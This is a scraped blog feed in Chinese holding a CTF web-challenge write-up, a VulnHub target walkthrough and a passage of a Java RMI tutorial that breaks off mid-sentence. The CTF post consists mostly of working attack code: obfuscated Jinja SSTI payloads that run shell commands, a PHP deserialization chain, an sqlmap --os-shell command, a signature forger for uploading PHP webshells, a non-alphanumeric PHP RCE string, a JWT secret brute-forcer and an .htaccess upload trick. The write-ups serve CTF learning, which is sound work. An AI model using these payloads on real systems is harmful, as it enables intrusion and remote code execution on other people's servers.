<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;guest&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;isAdmin&quot;: true,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="DANGEROUS-TRIAL"><a href="#DANGEROUS-TRIAL" class="headerlink" title="DANGEROUS TRIAL"></a>DANGEROUS TRIAL</h2><p><img src="/posts/b5e7950d/1762082300907-4154bb19-5417-42f2-9f38-7a32981d6432.png" alt="img"></p>
<p>这里有一个字典，用它的字典去爆破</p>
<p><img src="/posts/b5e7950d/1762082427979-edebc623-8b49-4f09-9cd4-2a217de13c05-1762930987387-80.webp" alt="image.png"></p>
<p><img src="/posts/b5e7950d/1762082583115-eec6a5b1-b0b3-4ffb-b3e5-91242311d665.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat=114514a&amp;Slime=data://text/plain;base64,cmltdXJ1</span><br><span class="line">NSS[CTF.LOVE=highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))));</span><br></pre></td></tr></table></figure>



<h2 id="我是签到"><a href="#我是签到" class="headerlink" title="我是签到"></a>我是签到</h2><p><img src="/posts/b5e7950d/1762082686732-f54daaa9-507e-4f36-b577-c6501c8386d0.png" alt="img"></p>
<p>file_get_contents的rce</p>
<p>直接用脚本就行了</p>
<p><img src="/posts/b5e7950d/1762082810546-98206028-901d-4aaa-8123-ff535384d1d5.png" alt="img"></p>
<p><img src="/posts/b5e7950d/1762082827190-032a4509-d4aa-4b25-b6b9-f9c58e50cd93.png" alt="img"></p>
<h2 id="我是复读机"><a href="#我是复读机" class="headerlink" title="我是复读机"></a>我是复读机</h2><p>信息泄露robots.txt</p>
<p><img src="/posts/b5e7950d/1762082935209-a786d31b-e6b9-4474-a4ce-b8a03407247a.png" alt="img"></p>
<p>源码泄露key session伪造之后打ssti即可</p>
<p>payloada:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&quot;][0][&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;]()[138][&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;][&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&quot;\x70\x6f\x70\x65\x6e&quot;](&#x27;ls /&#x27;)[&quot;\x72\x65\x61\x64&quot;]()&#125;&#125;a:</span><br></pre></td></tr></table></figure>

<p>当然使用attr字符拼接也可以绕过waf</p>
<h2 id="“j”wt"><a href="#“j”wt" class="headerlink" title="“j”wt"></a>“j”wt</h2><p><img src="/posts/b5e7950d/1762084609134-b7900aa1-a21b-471c-9d46-0c6679524e03.png" alt="img"></p>
<p>账号密码暴露</p>
<p><img src="/posts/b5e7950d/1762084826591-32211a79-78d7-460f-910f-542a5a3b581d.png" alt="img"></p>
<p>返回token</p>
<p><img src="/posts/b5e7950d/1762084858232-1017a099-fea4-4cdb-8706-44a29181145e.png" alt="img"></p>
<p><img src="/posts/b5e7950d/1762084913800-61a54982-1313-4682-b01d-73d774556f0c.png" alt="img"></p>
<p>验证</p>
<p><img src="/posts/b5e7950d/1762084950581-a8cd324d-38e0-4948-a2c3-492e0b54ba9f.png" alt="img"></p>
<p>还要有Bearer </p>
<p><img src="/posts/b5e7950d/1762085550926-0cdb98c8-bf76-4474-a887-4e05b3eb68e4.png" alt="img"></p>
<p>还有密钥的泄露，别忘喽</p>
<h2 id="FIRST-MEETING"><a href="#FIRST-MEETING" class="headerlink" title="FIRST MEETING"></a>FIRST MEETING</h2><p><img src="/posts/b5e7950d/1762085680872-72f84396-2f8c-4768-bfed-9689931fe22b-1762931075326-97.png" alt="img"></p>
<p>对原生类的调用</p>
<p>利用SplFileObject读取文件</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class WEB &#123;</span><br><span class="line">    private $sauy;</span><br><span class="line">    public function __construct($sauy) &#123;</span><br><span class="line">        $this-&gt;sauy = $sauy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PWN &#123;</span><br><span class="line">    public $wings = &#x27;SHENG-YI&#x27;;</span><br><span class="line">    public $c0trick;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class REVERSE &#123;</span><br><span class="line">    protected $re1sen;</span><br><span class="line">    public $harukaze;</span><br><span class="line">    public $ysyy;</span><br><span class="line">    public $acc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MISC &#123;</span><br><span class="line">    public $cr4p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CRYPTO &#123;</span><br><span class="line">    public $kyarihoshi;</span><br><span class="line">    public $rocage;</span><br><span class="line">    public $last;</span><br><span class="line">    public $dance;</span><br><span class="line">    public $kiss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 构造链</span><br><span class="line">$crypto = new CRYPTO();</span><br><span class="line">$crypto-&gt;kyarihoshi = &quot;SplFileObject&quot;;  // 要执行的命令</span><br><span class="line">$crypto-&gt;rocage = &quot;/flag&quot;;      // 命令参数</span><br><span class="line">$crypto-&gt;last = &amp;$crypto-&gt;dance; // 绕过检查</span><br><span class="line"></span><br><span class="line">$misc = new MISC();</span><br><span class="line">$misc-&gt;cr4p = $crypto;</span><br><span class="line"></span><br><span class="line">$reverse = new REVERSE();</span><br><span class="line">$reverse-&gt;acc = $misc;</span><br><span class="line">// 构造MD5碰撞</span><br><span class="line">$reverse-&gt;harukaze = &quot;240610708&quot;;</span><br><span class="line">$reverse-&gt;ysyy = &quot;QNKCDZO&quot;;</span><br><span class="line"></span><br><span class="line">$pwn = new PWN();</span><br><span class="line">$pwn-&gt;c0trick = $reverse;</span><br><span class="line"></span><br><span class="line">$web = new WEB($pwn);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($web));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="sql仅仅只是sql吗？"><a href="#sql仅仅只是sql吗？" class="headerlink" title="sql仅仅只是sql吗？"></a>sql仅仅只是sql吗？</h2><p>用load_file能看到源码，然后发现只禁用了sqlmap的ua隐藏一下就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://node10.anna.nssctf.cn:23118/?id=111&quot; --user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101&quot; --os-shell</span><br></pre></td></tr></table></figure>

<p>即可getshell得到flag</p>
<h2 id="光能族，哎呀"><a href="#光能族，哎呀" class="headerlink" title="光能族，哎呀"></a>光能族，哎呀</h2><p>php文件不允许（phtml绕过），签名要和文件名和内容对应（伪造）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rc4(key, data):</span><br><span class="line">    &quot;&quot;&quot;RC4加密算法实现&quot;&quot;&quot;</span><br><span class="line">    S = list(range(256))</span><br><span class="line">    j = 0</span><br><span class="line"></span><br><span class="line">    # Key-scheduling algorithm (KSA)</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + S[i] + key[i % len(key)]) % 256</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    # Pseudo-random generation algorithm (PRGA)</span><br><span class="line">    i = j = 0</span><br><span class="line">    out = []</span><br><span class="line">    for byte in data:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + S[i]) % 256</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        out.append(byte ^ S[(S[i] + S[j]) % 256])</span><br><span class="line">    return bytes(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_signature(filename, file_content):</span><br><span class="line">    &quot;&quot;&quot;生成符合要求的签名&quot;&quot;&quot;</span><br><span class="line">    SECRET_KEY = b&quot;monika creambread&quot;</span><br><span class="line"></span><br><span class="line">    # 计算文件内容的MD5</span><br><span class="line">    content_md5 = hashlib.md5(file_content).hexdigest()</span><br><span class="line"></span><br><span class="line">    # 计算文件名的MD5并转换为字节</span><br><span class="line">    filename_md5 = hashlib.md5(filename.encode()).hexdigest()</span><br><span class="line">    filename_md5_bytes = bytes.fromhex(filename_md5)</span><br><span class="line"></span><br><span class="line">    # 使用RC4加密文件名MD5</span><br><span class="line">    rc4_result = rc4(SECRET_KEY, filename_md5_bytes)</span><br><span class="line"></span><br><span class="line">    # 组合最终签名</span><br><span class="line">    signature = rc4_result.hex() + content_md5</span><br><span class="line">    return signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试用例1：验证提供的签名</span><br><span class="line">test_filename = &quot;g.jpg&quot;</span><br><span class="line">test_content = b&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span><br><span class="line">expected_signature = &quot;e4ea7c66f36dd480795c2bea26dfcf5996a67d6f3fd00dc2353a3362cf5deed7&quot;</span><br><span class="line"></span><br><span class="line"># 生成签名</span><br><span class="line">generated_signature = generate_signature(test_filename, test_content)</span><br><span class="line">print(f&quot;生成的签名: &#123;generated_signature&#125;&quot;)</span><br><span class="line">print(f&quot;签名长度: &#123;len(generated_signature)&#125;&quot;)</span><br><span class="line">print(f&quot;签名验证: &#123;&#x27;成功&#x27; if generated_signature == expected_signature else &#x27;失败&#x27;&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 测试用例2：新文件测试</span><br><span class="line">new_filename = &quot;a.phtml&quot;</span><br><span class="line">new_content = b&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">new_signature = generate_signature(new_filename, new_content)</span><br><span class="line">print(f&quot;\n新文件签名: &#123;new_signature&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b5e7950d/1762087190303-a3d8170f-37b5-44a7-bdd0-24d215d1a3df.png" alt="img"></p>
<p><img src="/posts/b5e7950d/1762087231548-4a29ffd9-9aa7-4112-a07a-3e292eb8c92e.png" alt="img"></p>
<h2 id="登录框"><a href="#登录框" class="headerlink" title="登录框"></a>登录框</h2><p><img src="/posts/b5e7950d/1762087276497-625de008-6fb3-4561-8016-e2e349589d10.png" alt="img"></p>
<p>爆破一下就行123456</p>
<p><img src="/posts/b5e7950d/1762087319486-309d5e5b-08d9-4dd7-994b-5fc96268e8fe.png" alt="img"></p>
<p>我们不管前端的过滤直接去读文件</p>
<p><img src="/posts/b5e7950d/1762087367880-d2928699-c62b-4ca2-96eb-6647f865c4d5.png" alt="img"></p>
<h2 id="php命令执行"><a href="#php命令执行" class="headerlink" title="php命令执行"></a>php命令执行</h2><p><img src="/posts/b5e7950d/1762087517182-860d35a7-9443-4e14-974f-2de81c1c67f0-1762931196516-113.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_=system&amp;__=cat /ffffllll44444ggggg</span><br><span class="line"></span><br><span class="line">rce=$_=[]._;$_=$_[_];$_++;$_++;$_++;$__=++$_;$_++;$__=++$_.$__;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$__.++$_;$_=_.$_;$$_[_]($$_[__]);</span><br></pre></td></tr></table></figure>

<h2 id="Punishing"><a href="#Punishing" class="headerlink" title="Punishing"></a>Punishing</h2><p>爆破密钥的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import string</span><br><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_force_jwt_secret():</span><br><span class="line">    original_token = &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ikx1Y2lhIiwicm9sZSI6Imd1ZXN0In0.9775pWUcQiz0tJJ04SZC-mKgBdLs7KygnOsdDEz3WcE&quot;</span><br><span class="line">    header_encoded, payload_encoded, original_signature = original_token.split(&#x27;.&#x27;)</span><br><span class="line"></span><br><span class="line">    known_prefix = &quot;Selena&quot;</span><br><span class="line">    chars = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">    total = len(chars) ** 3</span><br><span class="line">    count = 0</span><br><span class="line"></span><br><span class="line">    print(f&quot;开始爆破，总共需要尝试 &#123;total&#125; 种组合&quot;)</span><br><span class="line"></span><br><span class="line">    for combo in itertools.product(chars, repeat=3):</span><br><span class="line">        count += 1</span><br><span class="line">        secret_suffix = &#x27;&#x27;.join(combo)</span><br><span class="line">        secret = known_prefix + secret_suffix</span><br><span class="line"></span><br><span class="line">        # 显示进度</span><br><span class="line">        if count % 1000 == 0:</span><br><span class="line">            print(f&quot;进度: &#123;count&#125;/&#123;total&#125; - 当前尝试: &#123;secret&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 手动计算签名</span><br><span class="line">        message = f&quot;&#123;header_encoded&#125;.&#123;payload_encoded&#125;&quot;.encode()</span><br><span class="line">        computed_signature = base64.urlsafe_b64encode(</span><br><span class="line">            hmac.new(secret.encode(), message, hashlib.sha256).digest()</span><br><span class="line">        ).decode().rstrip(&#x27;=&#x27;)</span><br><span class="line"></span><br><span class="line">        if computed_signature == original_signature:</span><br><span class="line">            print(f&quot;🎉 找到正确密钥: &#123;secret&#125;&quot;)</span><br><span class="line">            return secret</span><br><span class="line"></span><br><span class="line">    print(&quot;未找到正确密钥&quot;)</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    result = brute_force_jwt_secret()</span><br><span class="line">    if result:</span><br><span class="line">        print(f&quot;爆破完成! 密钥为: &#123;result&#125;&quot;)</span><br><span class="line">Selenahyw</span><br></pre></td></tr></table></figure>

<p>文件上传配置文件（<code>.htaccess</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=a.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>然后上传一句话木马即可</p>
<p><img src="/posts/b5e7950d/1762909066526-bcac68d7-e1f6-4b7d-8773-5ec54de28a42-1762931260318-123.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;9d9eeb01-8187-4b0b-b4fc-90fbcf3978ba&#125;</span><br></pre></td></tr></table></figure>



<h2 id="诚实大厅"><a href="#诚实大厅" class="headerlink" title="诚实大厅"></a>诚实大厅</h2><p>payload，使用fenjing一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;ocm|attr(&#x27;__eq__&#x27;)|attr(&#x27;__g&#x27;&#x27;lobals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__b&#x27;&#x27;uiltins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__i&#x27;&#x27;mport__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;mkdir /app/static&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;xvv|attr(&#x27;__eq__&#x27;)|attr(&#x27;__g&#x27;&#x27;lobals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__b&#x27;&#x27;uiltins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__i&#x27;&#x27;mport__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat /flag &gt; /app/static/flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>Me_and_My_girlfriend</title>
    <url>/posts/c2c6ec30/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p>
<p>靶机下载，然后和Hackademic.RTB1一样就行</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="/posts/c2c6ec30/1759924256932-394a4b48-9d5f-446f-a82c-32d048b8fe31.png" alt="img"></p>
<p>扫一下，发现靶机</p>
<p><img src="/posts/c2c6ec30/1759924370716-d0c4baf3-9a64-43f8-85f4-ef1e8db7c226.png" alt="img"></p>
<p>开放ssh 22端口</p>
<p><img src="/posts/c2c6ec30/1759924461606-e72831ce-18da-4340-a823-6f9c927d4984.png" alt="img"></p>
<p>xff伪造一下，在bp里配置一下规则试每次发包都含有xff的伪造</p>
<p><img src="/posts/c2c6ec30/1759924561727-d1d13d68-f4a7-4cb5-ab3c-00421f20daf3.png" alt="img"></p>
<p><img src="/posts/c2c6ec30/1759924583539-275a477b-be83-40f1-b891-ba1a12cb4115.png" alt="img"></p>
<p>在内置浏览器就可以访问了</p>
<p><img src="/posts/c2c6ec30/1759924630544-0fcb3395-fd6a-438c-97bc-f48d4eaaa26b.png" alt="img"></p>
<p>随便注册一个然后进行登陆</p>
<p><img src="/posts/c2c6ec30/1759924690855-09d143b5-bed6-45df-83ad-f3a4c43470f6.png" alt="img"></p>
<p>可以测试一下</p>
<p><img src="/posts/c2c6ec30/1759924744544-9b09d054-84f3-4cd3-9d88-bbdb9b6444d1.png" alt="img"></p>
<p>泄露了用户名和密码，我们猜测此用户名和密码和ssh远程登陆的用户名和密码有关</p>
<p>尝试登陆，id为5可以登陆成功</p>
<p><img src="/posts/c2c6ec30/1759924881633-740d3a05-de76-4c2f-af04-1f5ccb9c097d.png" alt="img"></p>
<p><img src="/posts/c2c6ec30/1759924905147-98f826ec-f1af-4abc-991e-69b5dbedf79d.png" alt="img"></p>
<p><img src="/posts/c2c6ec30/1759924935800-594d86cd-54e4-4cd7-b3a6-4fb8d428a53e.png" alt="img"></p>
<p>拿到flag1</p>
<p>然后进行信息收集</p>
<p><img src="/posts/c2c6ec30/1759925023486-a93569e6-0777-4cec-b918-309449e86095.png" alt="img"></p>
<p>php提权，</p>
<p><img src="/posts/c2c6ec30/1759925079700-64b32463-fdd0-408b-99b0-c0a71ba4c061.png" alt="img"></p>
<p>进入root得到flag2</p>
<p><img src="/posts/c2c6ec30/1759925119146-01cc6e33-b6bc-41b0-b044-6cb8321c8c27.png" alt="img"></p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>RMI_1</title>
    <url>/posts/fe391cb8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日开始java中RMI的学习<br>先记录一下RMI的坑点：RMI攻击手法只能在jdk8u121之前可以使用，因为在8u121之后bind rebind unbind这三个方法只能对localhost进行攻击</p>
<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ul>
<li>jdk8u65</li>
</ul>
<h1 id="RMI基础"><a href="#RMI基础" class="headerlink" title="RMI基础"></a>RMI基础</h1><h2 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h2><p><font style="color:rgb(51, 51, 51);">RMI (Remote Method Invocation) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台</font><a href="https://www.w3cschool.cn/article/30445887.html#"><u>计算机</u></a><font style="color:rgb(51, 51, 51);">也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。</font></p>
<p><font style="color:rgb(51, 51, 51);">Server 端通常会创建一个对象，并使之可以被远程访问。</font></p>
<p><font style="color:rgb(51, 51, 51);">这个对象被称为远程对象。Server 端需要注册这个对象可以被 Client 远程访问。</font></p>
<p><font style="color:rgb(51, 51, 51);">Client 端调用可以被远程访问的对象上的方法，Client 端就可以和 Server 端进行通信并相互传递信息。</font></p>
<p><font style="color:rgb(51, 51, 51);">说到这里，是不是发现使用 RMI 在构建一个分布式应用时十分方便，它和 RPC 一样可以实现分布式应用之间的互相通信，甚至和现在的微服务思想都十分类似。</font></p>
<p><img src="/posts/fe391cb8/1766035501529-9613048b-d624-4e87-a9dd-3f275aa16167.png"></p>
<p>来解释一下这个图：client，server，registry server将地址和端口注册在registry，client通过获取registry上的目标地址以及端口，对server进行一个远程的调用</p>
<h2 id="RMI的实现"><a href="#RMI的实现" class="headerlink" title="RMI的实现"></a>RMI的实现</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>先是定义了一个IRemoteOBJ接口，这个接口要求public，并且继承Remote接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface IRemoteOBJ extends Remote &#123;</span><br><span class="line">    //sayHello就是客户端要调用的方法，需要抛出RemooteException</span><br><span class="line"></span><br><span class="line">    public String sayHello(String keywords) throws RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后因为是服务端，被调用的地方这里肯定要写一个实现类RemoteOBJ的</p>
<p>这里继承的UnicastRemoteObject，用于生成Stub（存根） 	skeleton（骨架）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RemoteOBJ extends UnicastRemoteObject implements IRemoteOBJ &#123;</span><br><span class="line">    public RemoteOBJ() throws RemoteException &#123;</span><br><span class="line">        //UnicastRemoteObject.exportObject(this,0);如果不继承UnicastRemoteObject就需要手动导出</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String sayHello(String keywords) throws RemoteException &#123;</span><br><span class="line">        String upKeywords = keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        return upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后是我们需要去注册，方便客户端的使用</p>
<p>默认端口是1099</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class Rmiserver &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        IRemoteOBJ obj = new RemoteOBJ();</span><br><span class="line">        Registry r = LocateRegistry.createRegistry(1099);</span><br><span class="line">        r.bind(&quot;rmiserver&quot;, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p>一样客户端也要写一个接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface IRemoteOBJ extends Remote &#123;</span><br><span class="line">    //sayHello就是客户端要调用的方法，需要抛出RemooteException</span><br><span class="line"></span><br><span class="line">    public String sayHello(String keywords) throws RemoteException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后写一个RMIclient，通过这个类来连接服务端，从而进行一个调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIclient &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException &#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">        IRemoteOBJ remoteOBJ = (IRemoteOBJ) registry.lookup(&quot;rmiserver&quot;);</span><br><span class="line">        remoteOBJ.sayHello(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/fe391cb8/1766043103717-99980cf5-54d8-428e-be3c-6cbb4f889546.png"></p>
<p>在服务端这里调用成功，并且得到了HELLO</p>
<p>其实在这整个过程里面都是通过序列化和反序列化实现的</p>
<h2 id="从wireshark分析通信原理"><a href="#从wireshark分析通信原理" class="headerlink" title="从wireshark分析通信原理"></a>从wireshark分析通信原理</h2><h3 id="客户端与注册表之间的交互"><a href="#客户端与注册表之间的交互" class="headerlink" title="客户端与注册表之间的交互"></a>客户端与注册表之间的交互</h3><p><img src="/posts/fe391cb8/1766047387367-5da5e9f7-b97a-4db6-9dc5-74de35bf2271.png"></p>
<p>先是tcp的三次握手</p>
<p>然后接下来每一个RMI包后会跟一个tcp包，这个tcp包是一个确认包</p>
<p><img src="/posts/fe391cb8/1766047415444-da2f4a16-7ace-435c-a75f-2efee7459a00.png"></p>
<p>这里客户端向注册中心询问rmiserver的地址和端口</p>
<p><img src="/posts/fe391cb8/1766047484783-abb61654-8b6c-450c-a698-73a46ce80559.png"></p>
<p><img src="/posts/fe391cb8/1766047471097-f3d0b088-e431-4e83-8c51-25e7960eadc9.png"></p>
<p>这里给予回应，可以看到是明显的序列化</p>
<p>ac de 00 05 就是序列化的标志</p>
<h3 id="客户端另起一个端口与服务端的交互"><a href="#客户端另起一个端口与服务端的交互" class="headerlink" title="客户端另起一个端口与服务端的交互"></a>客户端另起一个端口与服务端的交互</h3><p>客户端与服务器进行一个交互，同样是使用序列化进行传输</p>
<p><img src="/posts/fe391cb8/1766047615918-74abbc68-cb2d-459c-b9de-8008b88c44dc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">IRemoteOBJ remoteOBJ = (IRemoteOBJ) registry.lookup(&quot;rmiserver&quot;);</span><br></pre></td></tr></table></figure>

<p>这应该是建立一个远程连接，然后到</p>
<h3 id="参数的传输"><a href="#参数的传输" class="headerlink" title="参数的传输"></a>参数的传输</h3><p><img src="/posts/fe391cb8/1766047930657-1f5211c0-30c2-4d3f-8f38-da6951c42924.png"></p>
<p>发送hello</p>
<p><img src="/posts/fe391cb8/1766047956662-275400a9-6e15-4a65-9d2c-32279fbce4df.png"></p>
<p>最后调用成功得到HELLO</p>
<p>其实在整个过程中我们能看到，客户端与服务端发送数据包的内容都是序列化之后的数据流，那么客户端与服务端肯定都有反序列化的功能。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在整个过程中建立了两次tcp的连接，第一次是客户端去连接1099的，第二次是服务端发送给客户端的。<br>第一次连接中，客户端会连接到注册中心，并传入序列化的name也就是要找的rmiserver，然后注册中心反序列化读取这个字节流。<br>第二次连接中，服务端发送给客户端 Call 的消息。客户端反序列化该对象，发现该对象是⼀个远程对象，并得到它的地址，客户端与其进行连接，实现远程调用。<br>其实就是，服务端创建远程对象，bind远程对象到注册中心上时，会给一个name，然后客户端带着name在注册中心上取得这个远程对象，建立连接，从而能够远程调用。</p>
<h2 id="从代码方面分析通信原理"><a href="#从代码方面分析通信原理" class="headerlink" title="从代码方面分析通信原理"></a>从代码方面分析通信原理</h2><p>注册中心：存储名字和远程对象<br>服务端，客户端和注册中心，三者相互通信，所以一共有6个过程</p>
<p><img src="/posts/fe391cb8/1766049177536-8b56d229-cf63-4537-ae9e-c5c47ad6e944.png"></p>
<h3 id="1-创建远程对象"><a href="#1-创建远程对象" class="headerlink" title="1.创建远程对象"></a>1.创建远程对象</h3><p>创建远程对象这一块是不存在漏洞的。<br><img src="/posts/fe391cb8/20251220192101859.png" alt="image.png"><br>远程对象的创建点在这里，我们在这边打个断点开始调试</p>
<p><img src="/posts/fe391cb8/20251220192517359.png" alt="image.png"><br>到这边是对远程对象进行一个发布</p>
<h4 id="发布远程对象"><a href="#发布远程对象" class="headerlink" title="发布远程对象"></a>发布远程对象</h4><p>这里我们主要研究的是如何将远程对象发布到网络上<br>首先RemoteOBJ这个类继承UnicastRemoteObject这个类，所以这边会到父类的构造函数</p>
<p><img src="/posts/fe391cb8/20251220193427744.png" alt="image.png"><br>然后会先到第一个点的位置，这里传的参数是0，所以继续向下运行，会将0赋值给port也就是第二点的位置，这里port为0也就相当于我们这里发布的远程服务会随机调用一个端口。<br><code>注意点：这里的端口为远程对象的端口和1099没有关系，1099是注册中心开放的端口</code></p>
<p><img src="/posts/fe391cb8/20251220193942539.png" alt="image.png"><br>这里的exportObject类，叫做发布对象&#x2F;导出对象，从名字就可以看到这是一个发布远程对象的关键类，这也是上述远程对象类，可以不继承un那个类而直接可以手动调用exportObject这个类的原因。</p>
<p><img src="/posts/fe391cb8/20251220194442303.png" alt="image.png"><br>这里第一个参数就是我们要实现逻辑的这样一个对象，第二个参数调用了Unicaji</p>
